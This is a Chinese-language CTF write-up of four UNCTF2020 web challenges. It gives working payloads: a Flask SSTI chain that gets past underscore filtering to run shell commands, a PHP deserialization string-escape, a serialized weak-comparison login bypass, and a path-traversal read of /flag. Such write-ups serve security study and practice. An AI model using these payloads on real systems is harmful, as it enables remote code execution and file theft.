---
title: UNCTF2020 web
tags:
---

# easyflask
注册admin，在登陆，找到隐藏链接`secret_route_you_do_not_know`，提示猜数字，有点脑洞，再加上题目提示`flask`，`?guess={{2*8}}`，回显16，可以ssti\
fuzz过滤挺多，`.、_、[`等都凉了，附上payload：`/secret_route_you_do_not_know?guess={{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}&x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen("cat%20f*").read()`\
下划线过滤可以用`attr`绕过

# easyunserialize
ctfshow的36D中秋节出过一样的，反序列化字符串逃逸，payload：`?1=challengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";`，通过`str_replace`函数增长的字符数把自己序列化加的pass顶掉原来的

# ezphp
```php
<?php
show_source(__FILE__);
$username  = "admin";
$password  = "password";
include("flag.php");
$data = isset($_POST['data'])? $_POST['data']: "" ;
$data_unserialize = unserialize($data);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo $flag;
}else{
    echo "username or password error!";
}
```
构造数组绕过`Array
(
 [username] => 1
 [password] => 1
)`\
[弱比较](https://www.php.net/manual/zh/types.comparisons.php)\
payload：`a:2:{s:8:"username";b:1;s:8:"password";b:1;}`

# easy_ssrf
```php
<?php
echo'<center><strong>welc0me to 2020UNCTF!!</strong></center>';
highlight_file(__FILE__);
$url = $_GET['url'];
if(preg_match('/unctf\.com/',$url)){
    if(!preg_match('/php|file|zip|bzip|zlib|base|data/i',$url)){
        $url=file_get_contents($url);
        echo($url);
    }else{
        echo('error!!');
    }
}else{
    echo("error");
}
?>
```
盲猜flag在根目录，过滤不严谨，payload：`?url=unctf.com../../../../../../flag`